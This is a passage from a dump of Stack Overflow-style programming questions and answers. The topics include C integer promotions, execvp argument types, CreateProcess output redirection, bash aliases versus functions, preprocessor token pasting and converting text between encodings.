        print('Warning: ' + str(e.data))
        print('I will try again after 10 minutes...')
      else:
        raise e

  return result

def getUsernames(locations, gh):
  usernames = set()

  for location in locations:
    print location
    result = getResult(gh.legacy_search_users, location)
    for user in result:
      usernames.add(user.login)
      print user.login,

  return usernames

# ""main.py""
gh = Github()
locations = ['Washington', 'Berlin']
# ""main.py"", line 12 is bellow
usernames = getUsernames(locations, gh)
</code></pre>

<p>The problem is, that exception is raised, but I can't handle it. Here is an output:</p>

<pre><code>### loop
### try hard...
Traceback (most recent call last):
  File ""main.py"", line 12, in &lt;module&gt;
    usernames = getUsernames(locations, gh)
  File ""/home/ciembor/projekty/github-rank/functions.py"", line 39, in getUsernames
    for user in result:
  File ""/usr/lib/python2.7/site-packages/PyGithub-1.8.0-py2.7.egg/github/PaginatedList.py"", line 33, in __iter__
    newElements = self.__grow()
  File ""/usr/lib/python2.7/site-packages/PyGithub-1.8.0-py2.7.egg/github/PaginatedList.py"", line 45, in __grow
    newElements = self._fetchNextPage()
  File ""/usr/lib/python2.7/site-packages/PyGithub-1.8.0-py2.7.egg/github/Legacy.py"", line 37, in _fetchNextPage
    return self.get_page(page)
  File ""/usr/lib/python2.7/site-packages/PyGithub-1.8.0-py2.7.egg/github/Legacy.py"", line 48, in get_page
    None
  File ""/usr/lib/python2.7/site-packages/PyGithub-1.8.0-py2.7.egg/github/Requester.py"", line 69, in requestAndCheck
    raise GithubException.GithubException(status, output)
github.GithubException.GithubException: 403 {u'message': u'API Rate Limit Exceeded for 11.11.11.11'}
</code></pre>

<p>Why it doesn't print <code>### handling exception</code>?</p>
","9530","","<p>Take a close look at the stack trace in the exception:</p>

<pre><code>Traceback (most recent call last):
  File ""main.py"", line 12, in &lt;module&gt;
    usernames = getUsernames(locations, gh)
  File ""/home/ciembor/projekty/github-rank/functions.py"", line 39, in getUsernames
    for user in result:
  File ""/usr/lib/python2.7/site-packages/PyGithub-1.8.0-py2.7.egg/github/PaginatedList.py"", line 33, in __iter__
    newElements = self.__grow()
  ...
</code></pre>

<p>The exception is being thrown from code being called by the line <code>for user in result:</code> <em>after</em> <code>getResult</code> finishes executing.  This means that the API you're using is using lazy evaluation, so the actual API request doesn't quite happen when you expect it to.</p>

<p>In order to catch and handle this exception, you'll need to wrap the code inside the <code>getUsernames</code> function with a <code>try</code>/<code>except</code> handler.</p>
"
"<p>So lately I've been writing stuff where I have to use a lot of uint8/uint16 and mix them with each other and integer literals. So I'm getting warnings such as:</p>

<pre><code>warning: conversion to 'u16int' from 'int' may alter its value
</code></pre>

<p>Code:</p>

<pre><code>u16int attr = attr_byte &lt;&lt; 8;
</code></pre>

<p>I like compiling with lots of warnings on. I do not like getting warnings. Is there some (preferably clean) way to fix this?</p>
","9530","","<p>The C standard says that the ""integer promotions"" are performed on each of the operands and that the type of the result is that of the promoted left operand (C99 §6.5.7/3).</p>

<p>The integer promotions (§6.3.1.1/2) say that if an <code>int</code> can represent all of the possible values, then it's promoted to an <code>int</code>.  So, assuming that <code>attr_byte</code> is one byte, it can fit an <code>int</code>, so it's promoted to an <code>int</code>.  Thus, the result of the left shift is a (signed) <code>int</code>, so the compiler is right to complain that the conversion from <code>int</code> to <code>u16int</code> may alter its value.</p>

<p>In this instance, the result of the left shift will never be larger than 0xFF00 or less than 0, so there won't be any data loss.  But if you don't want the compiler to warn you here, you need to cast the result to <code>u16int</code>, since the result of the shift will always be an <code>int</code> or <code>unsigned int</code> (or a larger integer type), regardless of the types of its operands.</p>
"
"<p>What i need is:</p>

<p>1) read from string as sscanf does
2) measure the length of processed sequence as sscanf does with ""%n""
3) accept <code>format</code> and other arguments from above (no control over it)</p>

<p>is there a way how to do it?</p>

<pre><code>size_t read = 0; //Accumulator of the length of processed characters

void readfn (char* source_string, char* fmt, va_list args)
{
  int length;

  size_t fmtlen = strlen(fmt);

  char* fmt_and_lenght = (char*)realloc(fmt, fmtlen + 3);

  fmt_and_length[fmtlen]     = '%';
  fmt_and_length[fmtlen + 1] = 'n';
  fmt_and_length[fmtlen + 2] = '\0';

  va_list args_and_length = va_append(args, length); //here is the problem, i need to add &amp;length to the list (i dont care if the list is created from scretch

  vsscanf(source_str, fmt_and_length, args_and_length); //here i finally capture the length of processed string

  read += length; //and i do whatever i wanted to do with it
}
</code></pre>

<p>which would simply count the number of consumed characters even if the fmt didnt contain ""%n"" and the argument list did not capture it before?</p>

<p><strong>EDIT</strong>: it would definitely be better if there was vsnscanf or what name should it have, which would get the number of processed chars. But i solved this by splitting the format string by unescaped %. If it is not followed by * i fetch one argument and iteratively i handle all of them, each time i add ""%n"" and at the end i sum up the lengths.</p>
","9530","","<p>There's no portable way to do this.  I'd suggest you refactor your code so that you don't need to do this at all.  You might be able to cobble something together with the <a href=""http://www.gnu.org/software/libffcall/"" rel=""nofollow"">ffcall library</a>, but it'll be messy and fragile.</p>
"
"<p>I can't find a way of doing this, but is there a compiler flag for GCC/LLVM where I can get it to warn me about this:</p>

<pre><code>typedef float distance_feet_t;
typedef float distance_meters_t;

void shouldWarnMe ( void )
{
    distance_feet_t feet = 10.0f;
    distance_meters_t meters = 20.0f;

    /* this should generate a warning */
    distance_meters_t total = meters + feet;
}
</code></pre>

<p>In essence I want to redefine the variable types such that if I start mixing them then the compiler would warn that I am missing a cast.</p>

<p>I've tried -Wall: no warning.</p>

<p>There are ways of solving this problem without using typedefs. However the question is, is there a way of doing it with typedefs as described?</p>
","9530","","<p>Nope.  As far as the compiler is concerned, <code>distance_feet_t</code> and <code>distance_meters_t</code> are the exact same type.  I don't know of any way to do this in pure C, but you could definitely do it in C++ by defining a class for each different unit type and defining the appropriate overloaded operators (though there's a lot of annoying boilerplate there).</p>

<p>Side note: identifiers at global scope ending with the suffix <code>_t</code> are considered to be reserved by the POSIX standard; I'd suggest avoiding using such identifiers, although the likelihood of a conflict is pretty low (and easy to fix, should it happen).</p>
"
"<p>I am having trouble with using <code>execvp()</code>. <code>execvp()</code> expects type <strong>char * const*</strong> as second parameter. I want to parse arguments passed to application (in <code>argv</code>) and make an array of that type. For example, user is invoking the binary as given below:</p>

<pre><code>./myapp ""ls -a -l""
</code></pre>

<p>And then I make the below array from it:</p>

<pre><code>{""ls"", ""-a"", ""-l"", NULL}
</code></pre>

<p>Now, my code looks like:</p>

<pre><code>    const char* p[10];
    char temp[255] = ""ls -a -l"";

    p[0] = strtok(temp, "" "");
    for(i=0; i&lt;9; i++) {
        if( p[i] != NULL ) {
            p[i+1] = strtok(NULL, "" "");
        } else {
            break;
        }
    }
</code></pre>

<p>It works, but I am getting the warning: </p>

<p><code>main.c:47: warning: passing argument 2 of ‘execvp’ from incompatible pointer type
/usr/include/unistd.h:573: note: expected ‘char * const*’ but argument is of type ‘const char **’</code></p>

<p>How to do it <strong>correctly</strong>?</p>
","9530","","<p>The problem is that the second parameter of <code>execvp</code> is a <code>char * const *</code>, which is a ""pointer to a constant pointer to <em>non-constant</em> data"".  You're trying to pass it a <code>const char **</code>, which is a ""pointer to a pointer to <em>constant</em> data"".</p>

<p>The way to fix this is to use <code>char **</code> instead of <code>const char **</code> (since ""pointer to X"" is always allowed to be convert to ""pointer to <code>const</code> X"", for any type X (but <em>only</em> at the top level of pointers):</p>

<pre><code>char* p[10];
p[0] = ...;
// etc.
</code></pre>

<p>Note that if you do need to insert <code>const char *</code> parameters, you can cast them <code>char *</code> as long as you don't modify them.  Although the arguments to the <code>exec*</code> family of functions are declared as non-<code>const</code>, they won't ever modify them (see the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/exec.html#tag_16_111"" rel=""nofollow"">POSIX 2008 specification</a>).  The rationale there explains why they are declared as non-<code>const</code>.</p>
"
"<p>I'm sure this question gets asked a lot but I just want to make sure there's not a better way to do this. </p>

<p>Basically, I have a const char* which points to a null-terminated C string. I have another function which expects a const wchar_t* pointing to a string with the same characters.</p>

<p>For the time being, I have been trying to do it like this:</p>

<pre><code>    size_t newsize = strlen(myCString) + 1;
    wchar_t * wcstring = new wchar_t[newsize];
    size_t convertedChars = 0;

    mbstowcs_s(&amp;convertedChars, wcstring, newsize, myCString, _TRUNCATE);

    delete[] wcstring;
</code></pre>

<p>I need to make these conversions in a lot of places since I'm dealing with 3rd party libraries which expect one or the other. Is this the recommended way to go about this?</p>
","9530","","<p>What you're doing is pretty much the recommended way of doing it, assuming that your data is all ASCII. If you have non-ASCII data in there, you need to know what its encoding is: UTF-8, Windows-1252, any of the ISO 8859 variants, SHIFT-JIS, etc. Each one needs to be converted in a different way.</p>

<p>The only thing I would change would be to use <code>mbstowcs</code> instead of <code>mbstowcs_s</code>.  <code>mbstowcs_s</code> is only available on Windows, while <code>mbstowcs</code> is a standard C99 function which is portable. Of course, if you'd like to avoid the CRT deprecation warnings with the Microsoft compiler without completely turning them off, it's perfectly fine to use a macro of <code>#if</code> test to use <code>mbstowcs</code> on non-Windows systems and <code>mbstowcs_s</code> on Windows systems.</p>

<p>You can also use <code>mbstowcs</code> to get the length of the converted string by first passing in <code>NULL</code> for the destination. That way, you can avoid truncation no matter how long the input string is; however, it does involve converting the string twice.</p>

<p>For non-ASCII conversions, I recommend using <a href=""http://www.gnu.org/software/libiconv/"" rel=""nofollow"">libiconv</a>.</p>
"
"<p>Whenever I encounter a substitute character <a href=""http://en.wikipedia.org/wiki/Substitute_character"" rel=""nofollow"">http://en.wikipedia.org/wiki/Substitute_character</a> while reading a file in C++ using getline(), it is interpreted as a EOF so I cannot advance with my reading in order to get the file entire content. So my question is, how can I skip the substitute characters and read the content of the file until the ""real"" EOF?</p>
","9530","","<p>Open the file in binary mode instead of text mode.  If you're using <code>fopen</code>, make open it in one of the <code>""b""</code> modes, e.g. <code>""rb""</code>.  If you're using a C++ <code>ifstream</code> object, open it with the <code>ios::binary</code> flag.</p>

<p>For example:</p>

<pre><code>// C method
FILE *f = fopen(""filename"", ""rb"");

// C++ method
std::ifstream f(""filename"", std::ios::in | std::ios::binary);
</code></pre>
"
"<p>I would like to get names of only *.txt files in given directory, sth like this:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dirent.h&gt;

int main(int argc, char **argv)
{
    char *dirFilename = ""dir"";

    DIR *directory = NULL;

    directory = opendir (dirFilename);
    if(directory == NULL)
        return -1;

    struct dirent *ent;

     while ((ent = readdir (directory)) != NULL)
     {
         if(ent-&gt;d_name.extension == ""txt"")
            printf (""%s\n"", ent-&gt;d_name);
     }

    if(closedir(directory) &lt; 0)
        return -1;

    return 0;
}
</code></pre>

<p>How can I do this in pure unixs c?</p>
","9530","","<p>You're almost there, you just need to check if the filename ends with <code>.txt</code>.  One way to do that is to use <code>strcmp</code>, <code>strcasecmp</code>, or <code>memcmp</code>:</p>

<pre><code>while ((ent = readdir (directory)) != NULL)
{
    int len = strlen(ent-&gt;d_name);
    if(len &gt; 4 &amp;&amp; memcmp(ent-&gt;d_name + len - 4, "".txt"", 4) == 0)  // only checks lowercase
    {
        // It's a .txt file - now check that it's a regular file
        char filename[PATH_MAX];
        snprintf(filename, sizeof(filename), ""%s/%s"", dirFilename, ent-&gt;d_name);
        struct stat st;
        if(stat(filename, &amp;st) == 0 &amp;&amp; S_ISREG(st.st_mode))
        {
            // It's a regular file - process it
        }
    }
}
</code></pre>

<p>It's a good idea to verify that it's a regular file (and not a directory or other type of special file) by calling <a href=""http://linux.die.net/man/2/stat"" rel=""nofollow""><code>stat(2)</code></a> on the full file path and checking the <code>st_mode</code> field with the <code>S_ISxxx</code> macros.  Note that the <code>d_type</code> member of the <code>DIR</code> struct returned by <code>readdir</code> isn't always supported, so it's not a good idea to rely on it.</p>

<p>Alternatively, instead of using <code>opendir</code>, <code>readdir</code>, and <code>closedir</code>, you can use the <a href=""http://linux.die.net/man/3/glob"" rel=""nofollow""><code>glob(3)</code></a> function:</p>

<pre><code>glob_t globbuf;
if(glob(""/path/to/dir/*.txt"", 0, NULL, &amp;globbuf) == 0)
{
  int i;
  for(i = 0; i &lt; globbuf.gl_pathc; i++)
    process_filename(globbuf.gl_pathv[i]);
}
globfree(&amp;globbuf);
</code></pre>
"
"<p>I'm stuck with following problem:</p>

<pre><code>int sort_compare(const void *x, const void *y) {
    const int *xi = *(const int **) x;
    const int *yi = *(const int **) y;

    for (int i = 0; i &lt; block_size; i++) {
        comp_x[i] = block[(*xi + i) % block_size];
        comp_y[i] = block[(*yi + i) % block_size];
    }

    return memcmp(comp_x, comp_y, block_size);
}

void sort() {
    for (int i = 0; i &lt; block_size; i++) {
        printf(""%d,"", to_sort[i]);
    }
    puts("""");
    qsort(to_sort, block_size, sizeof (int), sort_compare);
    for (int i = 0; i &lt; block_size; i++) {
        printf(""%d,"", to_sort[i]);
    }
    puts("""");
}

values:
    block_size = 5;
    block = ""jkldj"";
    comp_x, compy_y and to_sort are well allocated

output:
    0,1,2,3,4,
    3,0,1785357420,1,1684826986,
</code></pre>

<p>to_sort contains the first letter from a (circular) string e.g. </p>

<pre><code>qwer
werq
erqw
rqwe
</code></pre>

<p>, represented as (0,1,2,3) needs to be sorted to</p>

<pre><code>erqw
rqwe
qwer
werq
</code></pre>

<p>, represented as (2,3,0,1). I seem to get very large numbers, why is that?</p>

<p>Thanks in advance!</p>
","9530","","<p>The <code>x</code> and <code>y</code> passed into your comparator are pointers to your array elements.  Your array elements are <code>int</code>s, so to get the <code>int</code> values, you need to cast the <code>void</code> pointers into <code>int</code> pointers and dereference.  You have an extra layer of indirection in your code, it should really look like this:</p>

<pre><code>int xi = *(const int *) x;
int yi = *(const int *) y;
</code></pre>

<p>Then just use <code>xi</code> and <code>yi</code> directly instead of <code>*xi</code> and <code>*yi</code> when doing the data comparison.</p>

<p>As an optimization, there's no need to copy the data into separate arrays and then <code>memcmp</code> them -- you can just compare them yourself in the loop:</p>

<pre><code>for (int i = 0; i &lt; block_size; i++) {
    char data_x = block[(xi + i) % block_size];
    char data_y = block[(yi + i) % block_size];
    if (data_x != data_y)
        return data_x - data_y;
}

return 0;
</code></pre>

<p>And as a further optimization, if you double the data in the <code>block</code> array (e.g. so that it has <code>""qwerqwer""</code> instead of just <code>""qwer""</code>), you can do the comparison in a single call to <code>memcmp</code>, since you no longer have to deal with the wraparound.  <code>memcmp</code> is heavily optimized, so if you have a lot of data, it can be much faster to use <code>memcmp</code> then a hand-written for loop.</p>
"
"<p>Is there a way to determine the amount of memory installed on a computer running
64bit windows 7, using VS2010 C? </p>

<p>The app I am running is a Windows 64bit app, with
a UI written in c#, which calls a dll written in C.  The call to get the installed
memory has to be done from the C code, not the c#.</p>
","9530","","<p>Use the <a href=""http://msdn.microsoft.com/en-us/library/aa366589%28VS.85%29.aspx"" rel=""nofollow""><code>GlobalMemoryStatusEx</code></a> function:</p>

<pre><code>MEMORYSTATUSEX memInfo = {sizeof(memInfo)};
if (GlobalMemoryStatusEx(&amp;memInfo))
{
    printf(""Total installed physical memory: %lld bytes\n"", memInfo.ullTotalPhys);
}
</code></pre>
"
"<p>I've seen <code>std::string</code> used in a <code>.c</code> file. std is a c++ namespace and namespaces were introduced in c++. Why is that so? Shouldn't it throw an error?</p>
","9530","","<p>Yes, it will cause numerous compiler errors if it's compiled as C code.  If it's being compiled as C++ instead, then it will compile fine.  For example, GCC has the <code>-x</code> option to select the language to compile as, so you can compile a <code>.c</code> as C++ if you want with <code>-x c++</code>.  Likewise, the Microsoft Visual C++ compiler has the options <code>/Tc</code> and <code>/Tp</code> to select a source language of C and C++ respectively.</p>

<p>I suggest you fix your build system so that it doesn't pass the <code>-x c++</code> or <code>/Tp</code> flag to files not ending with typical C++ source file extensions (<code>.cc</code>, <code>.cpp</code>, <code>.cxx</code>, <code>c++</code>, and <code>.C</code>, though the last three are quite rare).</p>
"
"<p>I was reading some code and came across this thing. I don't have the whole context now save this line.</p>

<pre><code>cout&lt;&lt;(*--*++ptr+1)&lt;&lt; endl;
</code></pre>

<p>this compiles fine and works when we input values in it..</p>

<p>its declaration is like this.</p>

<pre><code>char ***ptr ;
</code></pre>

<p>What is this operator and is it included in the standard?</p>
","9530","","<p>It's not a single operator, it's a combination of several unary operators.  It gets parsed like this:</p>

<pre><code>*(--(*(++ptr))) + 1
</code></pre>

<p>So, <code>ptr1</code> is first incremented, then dereferenced, then that value is decremented and dereferenced again.</p>
"
"<p>I know that in winapi exist <code>ReadFile()</code> function for reading data from file, but I don't know how can I set the position of reading from file. Can I do this using WinAPI?</p>
","9530","","<p>Yes, you can do that with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365542%28v=vs.85%29.aspx"" rel=""nofollow""><code>SetFilePointerEx</code></a>.  However, unless you have a good reason for using the raw WinAPI, it's generally a better idea to use a cross-platform I/O library, such as C's stdio library or C++'s iostream library.  That way, your code is portable to any platform.</p>
"
"<p>i'm using VS2010, and i am designing a MVC application.</p>

<p>Say i have ""Project 1"" and ""Project 2"" in a solution. The need to be compiled in that order, P1 compiles to a DLL, P2 to an Exe file that dynamically uses the DLL. P2 declares a view interface. Both projects have a view class that implements the interface (a class with pure virtual methods).</p>

<p>The problem now is, that i cannot include the header file of the interface in P1, because the linker would say then that he cannot resolve this external symbol. Which is of course right, because it is compiled later in P2.</p>

<p>So what i did is, i added the include folder for P2 to P1 and included the interface.cpp in P1 instead of the header file.</p>

<p>It works, but i don't think this is what i am supposed to do. Or isn't it? The interface is obviously compiled twice, once in each project.</p>

<p>I don't want to move the interface to P1, what would solve the problem. Just assume, i don't want that.</p>

<p>Thanks for input.</p>

<p>edit: code snippet:</p>

<pre><code>Project1:

View1.hpp // nothing special

View1.cpp:

#include ViewInterface.cpp
View1::View1(int x) : ViewInterface(int x)

Project2:

ViewInterface.hpp:

#ifdef EXP
#define DECLDIR __declspec(dllexport)
#else
#define DECLDIR __declspec(dllimport)
#endif

class ViewInterface : SomeOtherClass, AnotherClass
{
  virtual void DECLDIR show(void) const = 0;
  virtual void DECLDIR hide(void) const = 0;
}

ViewInterface.cpp:

ViewInterface::ViewInterface(int x) : SomeOtherClass(int x), AnotherClass(int x)

View2.hpp // nothing special

View2.cpp:
#define EXP
#include ViewInterface.h

View2::View2(int x) : ViewInterface(int x)
</code></pre>
","9530","","<p>In order for the executable to use classes from the DLL, you need to make sure that they're exported properly.  When you compile the DLL, you mark the class with <a href=""http://msdn.microsoft.com/en-us/library/a90k134d%28v=vs.100%29.aspx"" rel=""nofollow""><code>__declspec(dllexport)</code></a>, and when you compile the executable, you instead mark the class with <code>__declspec(dllimport)</code>.  Typically this is done with a macro like so:</p>

<pre><code>// In your DLL's header file
#ifdef COMPILING_MY_DLL
#define MY_EXPORT __declspec(dllexport)
#else
#define MY_EXPORT __declspec(dllimport)
#endif

class MY_EXPORT MyClass
{
    ...
};
</code></pre>

<p>Then, in <em>only</em> your DLL project, you define the macro <code>COMPILING_MY_DLL</code>.</p>
"
"<p>ello all I hope someone can help me with this issue I am using the following example from msdn for createprocess function.</p>

<pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;

void _tmain( int argc, TCHAR *argv[] )
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &amp;si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &amp;pi, sizeof(pi) );

    if( argc != 2 )
    {
        printf(""Usage: %s [cmdline]\n"", argv[0]);
        return;
    }

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &amp;si,            // Pointer to STARTUPINFO structure
        &amp;pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( ""CreateProcess failed (%d).\n"", GetLastError() );
        return;
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}
</code></pre>

<p>This is accessed via dos and works perfectly using this command in command prompt. When I type this </p>

<p>this.exe ""my.exe test"" > result.txt</p>

<p>The my.exe is another console application that takes the input test and the > result.txt is for my output log. I am trying to remove the need for the command line so I am trying to feed the path into the createprocess function call. This is where I get stuck here is what I am trying </p>

<pre><code>if( !CreateProcess( NULL,   // No module name (use command line)
        ""\""my.exe test \"" &gt; result.txt"",        // this.exe ""my.exe test"" &gt; result.txt
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
</code></pre>

<p>still doesnt work I thought \"" would give me the result I needed but it doesnt seem to work, will parse the my.exe and test part but not the > result.txt output. However it works from the command prompt fine if i pass it to argv[1].</p>

<p>Any help much appreciated. </p>

<p>So in summary </p>

<p>In console I can parse </p>

<pre><code>this.exe ""my.exe test"" &gt; result.txt // Works fine via cmd.exe
</code></pre>

<p>To app I tried</p>

<pre><code>my.exe test &gt; result.txt // Not work but missing """"
</code></pre>

<p>and </p>

<pre><code>\""my.exe test \"" &gt; result.txt // work for first section 
</code></pre>
","9530","","<p><code>CreateProcess</code> only does basic command line parsing by breaking up the words into individual arguments -- it doesn't understand file redirection or anything.  If you pass it <code>""&gt; result.txt""</code>, it tries to parse that as two arguments named literally <code>""&gt;""</code> and <code>""result.txt""</code>.</p>

<p>If you want to redirect the output of the command, you have two options:</p>

<ol>
<li>Do the redirection yourself.  To do that, you'd first open the file with <code>CreateFile</code> (passing in security attributes which make the handle inheritable), and then assign the resulting handle to the <code>hStdOut</code> member of the <code>STARTUPINFO</code> structure you pass in.  Then, remember to close the file after <code>CreateProcess</code> returns, since otherwise you'd leak a handle.</li>
<li><p>Use another program to do the redirection.  When you type in commands on the command line, it's <code>cmd.exe</code> which parses your command line and does the file redirection.  So instead of creating a <code>my.exe</code> process, you could instead create a <code>cmd.exe</code> process with a command line something like this:</p>

<pre><code>cmd.exe ""my.exe test &gt; result.txt""
</code></pre></li>
</ol>
"
"<p>I am porting a windows application to OS X 10.6.8. It is a new platform for me and I am facing some difficulties.</p>

<p>The application is a small webserver (bottle+waitress) which is starting a browser (based on chromium embedded framework) thanks to a subprocess call.</p>

<p>The browser is an app file and runs ok when started from gui.</p>

<p>I am launching it this way:</p>

<pre><code>subprocess.Popen([os.getcwd()+""/cef/cefclient.app"", '--url=http://127.0.0.1:8100'])
</code></pre>

<p>Unfortunately, this fails with <code>OSError: permission denied</code>.</p>

<p>I tried to run the script with a <code>sudo</code> with similar result.</p>

<p>I can launch the app from shell with the following command:</p>

<pre><code>open -a ""cef/cefclient.app"" --args --url-http://127.0.0.1:8100
</code></pre>

<p>But </p>

<pre><code>subprocess.Popen(['open', '-a', os.getcwd()+'/cef/cefclient.app', '--args', '--url-http://127.0.0.1:8100'])
</code></pre>

<p>fails with the following error</p>

<pre><code>FSPathMakeRef(/Users/.../cefclient.app) failed with error -43.
</code></pre>

<p>Any idea how to fix this issue?</p>
","9530","","<p>The file <code>cefclient.app</code> is actually a directory (an <a href=""http://en.wikipedia.org/wiki/Application_bundle"" rel=""nofollow"">application bundle</a>, specifically), not the application executable.  The real executable is located inside the bundle, with a path like <code>Contents/MacOS/executable_name</code>.  So to launch it, you'd do this:</p>

<pre><code>subprocess.Popen([os.getcwd()+""/cef/cefclient.app/Content/MacOS/executable_name"",
                  ""--url=http://127.0.0.1:8100""])
</code></pre>
"
"<p>I want to speed up the time it takes me to compile a file in C using aliases.</p>

<p>Here is my alias:</p>

<pre><code>alias gccp=""gcc -pendantic -Wall -ansi '$1'.c -o '$1'""   
</code></pre>

<p>I try gccp p1 and expect it to run the command <code>gcc -pendantic -Wall -ansi p1.c -o p1</code>.</p>

<p>What am I doing wrong?</p>
","9530","","<p>Aliases can't take arguments, see the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Aliases"" rel=""nofollow"">Bash manual</a>.  When you invoke an alias with arguments, the arguments just get appended to the end of the command, since the shell is really only substituting the command name for the alias value.</p>

<p>Use a <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Shell-Functions"" rel=""nofollow"">shell function</a> instead:</p>

<pre><code>gccp ()
{
    gcc -pendantic -Wall -ansi ""$1"".c -o ""$1""
}
</code></pre>
"
"<p>let's say I want to select the behaviour of a certain preprocessor directive evaluating at compile time the concatenation of a constant string and the result of another macro.</p>

<pre><code>#define CASE1 text1
#define CASE2 text2
#define CASE3 text3
#define SCENARIO 3
/** the following won't work - for examplification purposes only**/
#define FUNCTION CASE##SCENARIO

/** whenever I write FUNCTION, I expect to see text3 **/
</code></pre>

<p>I am having an hard time thinking of a viable solution, as the preprocessor is a one-pass beast. Is that even feasible ?</p>
","9530","","<p>It's possible, you just need to add some extra layers of macros.  The key is that when you use the token-pasting operator <code>##</code>, the preprocessor will not expand its operands.  But, if you add another layer of macros, the preprocessor will expand those arguments.  For example:</p>

<pre><code>#define CASE1 text1
#define CASE2 text2
#define CASE3 text3
#define SCENARIO 3

#define TOKENPASTE_HELPER(x, y) x ## y
#define TOKENPASTE(x, y) TOKENPASTE_HELPER(x, y)
#define FUNCTION TOKENPASTE(CASE, SCENARIO)
</code></pre>

<p>When the preprocessor expands <code>FUNCTION</code>, it expands <code>TOKENPASTE</code>.  When it expands <code>TOKENPASTE</code>, it expands its arugments (so <code>SCENARIO</code> gets replaced by <code>3</code>), since neither of its arguments are operands of the token-pasting operator.  Next, it expands <code>TOKENPASTE_HELPER</code>, which does the actual token pasting to make <code>CASE3</code>.  Finally, it expands the <code>CASE3</code> macro to get <code>text3</code>.</p>
"
"<p>I am receiving an xml feed of product information. The information is in English, but it is not encoded in <code>utf-8</code> (smart quotes, copyright symbols, etc.). To process the information, I need to convert it into <code>utf-8</code>.</p>

<p>I have tried doing variations of:</p>

<pre><code>u'%s' % data
codecs.open(..., 'utf-8')
unicode(data)
</code></pre>

<p>But for every one I've tried I get a <code>UnicodeDecodeError</code> (of various sorts).</p>

<p>How would I convert all this text into <code>utf-8</code> ?</p>

<p><strong>Update</strong></p>

<p>Thanks for the help, here is what ended up working:</p>

<pre><code>encoded_data = data.decode('ISO 8859-1').encode('utf-8').replace('Â','')
</code></pre>

<p>I'm not sure where the <code>Â</code> came from, but I saw those next to some copyright symbols.</p>
","9530","","<p>In order to convert it to UTF-8, you need to know what encoding it's in.  Based on your description, I'm guessing that it's in one of the Latin-1 variants, ISO 8859-1 or Windows-1252.  If that's the case, then you could convert it to UTF-8 like so:</p>

<pre><code>data = 'Copyright \xA9 2012'  # \xA9 is the copyright symbol in Windows-1252

# Convert from Windows-1252 to UTF-8
encoded = data.decode('Windows-1252').encode('utf-8')

# Prints ""Copyright © 2012""
print encoded
</code></pre>
"
"<p>I'm trying to implement text support in Windows with the intention of also moving to a Linux platform later on.  It would be ideal to support international languages in a uniform way but that doesn't seem to be easily accomplished when considering the two platforms in question.  I have spent a considerable amount of time reading up on UNICODE, UTF-8 (and other encodings), widechars and such and here is what I have come to understand so far:</p>

<p>UNICODE, as the standard, describes the set of characters that are mappable and the order in which they occur.  I refer to this as the ""what"": UNICODE specifies <em>what</em> will be available.</p>

<p>UTF-8 (and other encodings) specify the <em>how</em>: How each character will be represented in a binary format.</p>

<p>Now, on windows, they opted for a UCS-2 encoding originally, but that failed to meet the requirements, so UTF-16 is what they have, which is also multi-char when necessary.</p>

<p>So here is the delemma:</p>

<ol>
<li>Windows internally only does UTF-16, so if you want to support international characters you are forced to convert to their widechar versions to use the OS calls accordingly.  There doesn't seem to be any support for calling something like CreateFileA() with a multi-byte UTF-8 string and have it come out looking proper.  Is this correct?</li>

<li>In C, there are some multi-byte supporting functions (_mbscat, _mbscpy, etc), however, on windows, the character type is defined as unsigned char* for those functions.  Given the fact that the _mbs series of functions is not a complete set (i.e. there is no _mbstol to convert a multi-byte string to a long, for example) you are forced to use some of the char* versions of the runtime functions, which leads to compiler problems because of the signed/unsigned type difference between those functions.  Does anyone even use those?  Do you just do a big pile of casting to get around the errors?</li>

<li>In C++, std::string has iterators, but these are based on char_type, not on code points.  So if I do a ++ on an std::string::iterator, I get the next char_type, not the next code point.  Similarly, if you call std::string::operator[], you get a reference to a char_type, which has the great potential to not be a complete code point.  So how does one iterate an std::string by code point? (C has the _mbsinc() function).</li>
</ol>
","9530","","<blockquote>
  <ol>
  <li>Windows internally only does UTF-16, so if you want to support international characters you are forced to convert to their widechar versions to use the OS calls accordingly. There doesn't seem to be any support for calling something like CreateFileA() with a multi-byte UTF-8 string and have it come out looking proper. Is this correct?</li>
  </ol>
</blockquote>

<p>Yes, that's correct.  The <code>*A</code> function variants interpret the string parameters according to the currently active code page (which is Windows-1252 on most computers in the US and Western Europe, but can often be other code pages) and convert them to UTF-16.  There is a UTF-8 code page, however AFAIK there isn't a way to programmatically set the active code page (there's <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd318070%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetACP</code></a> to get the active code page, but not corresponding <code>SetACP</code>).</p>

<blockquote>
  <ol>
  <li>In C, there are some multi-byte supporting functions (_mbscat, _mbscpy, etc), however, on windows, the character type is defined as unsigned char* for those functions. Given the fact that the _mbs series of functions is not a complete set (i.e. there is no _mbstol to convert a multi-byte string to a long, for example) you are forced to use some of the char* versions of the runtime functions, which leads to compiler problems because of the signed/unsigned type difference between those functions. Does anyone even use those? Do you just do a big pile of casting to get around the errors?</li>
  </ol>
</blockquote>

<p>The <code>mbs*</code> family of functions is almost never used, in my experience.  With the exception of <code>mbstowcs</code>, <code>mbsrtowcs</code>, and <code>mbsinit</code>, those functions are not standard C.</p>

<blockquote>
  <ol>
